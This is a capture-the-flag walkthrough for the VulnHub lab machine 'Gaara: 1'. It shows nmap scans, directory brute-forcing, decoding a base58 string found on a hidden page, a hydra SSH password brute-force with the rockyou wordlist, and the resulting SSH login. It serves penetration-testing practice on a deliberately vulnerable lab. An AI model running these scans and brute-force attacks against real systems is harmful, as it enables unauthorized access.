:::::::::::::: page
# Gaara: 1 {#gaara-1 .title}

\

## 

## Gaara: 1

- **[Gaara: 1]{style="color:#f66151;"}** :-

<!-- -->

- Download the machine : <https://www.vulnhub.com/entry/gaara-1,629/>

![](images/771-1.png)

- Open ova file .
- Then click finish .
- Start the machine .

1.  [Network Scanning]{style="color:#e01b24;"} :

- Find the machine IP :

::: codebox
    nmap -sn 192.168.2.0/24
:::

![](images/771-2.png)

- Run nmap master command :

::: codebox
    nmap -v -Pn -sT -sV -sC -A -O -p- 192.168.2.234
:::

![](images/771-3.png)

- Find available port in the machine ( Optional ) :

::: codebox
    nmap -v -p- 192.168.2.234
:::

- 

::: codebox
    nmap -sC -sV -A 192.168.2.234
:::

- This command runs an aggressive scan and uses the http-enum script to
  identify potential CGI directories .

::: codebox
    nmap -v -p 80 -sT -sV -A --script=http-enum.nse 192.168.2.234
:::

1.  [Web Enumeration]{style="color:#e01b24;"} :

- IP visit in browser : <http://192.168.2.234>

<!-- -->

- Directory brute force :

::: codebox
    dirsearch -u http://192.168.2.234 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
:::

![](images/771-4.png)

- Visit the parameter : <http://192.168.2.234/Cryoserver>

![](images/771-5.png)

- Visit hidden parameter in browser :

::: codebox
    /Temari
    /Kazekage
    /iamGaaara
:::

<http://192.168.2.234/Temari>

<http://192.168.2.234/Kazekage>

<http://192.168.2.234/iamGaara>

- In /iamGaara parameter find hidden encoded value :

::: codebox
    f1MgN9mTf9SNbzRygcU
:::

- 

![](images/771-6.png)

- Now Decode the value :

::: codebox
    python3 -c "import base58; print(base58.b58decode('f1MgN9mTf9SNbzRygcU').decode())"
:::

![](images/771-7.png)

- Run the hydra to find the password :

::: codebox
    hydra -l gaara -P /opt/rockyou.txt ssh://192.168.2.234
:::

![](images/771-8.png)

- Now make the ssh connection :

::: codebox
    ssh gaara@192.168.2.234
:::

![](images/771-9.png) ![](images/771-10.png)
::::::::::::::
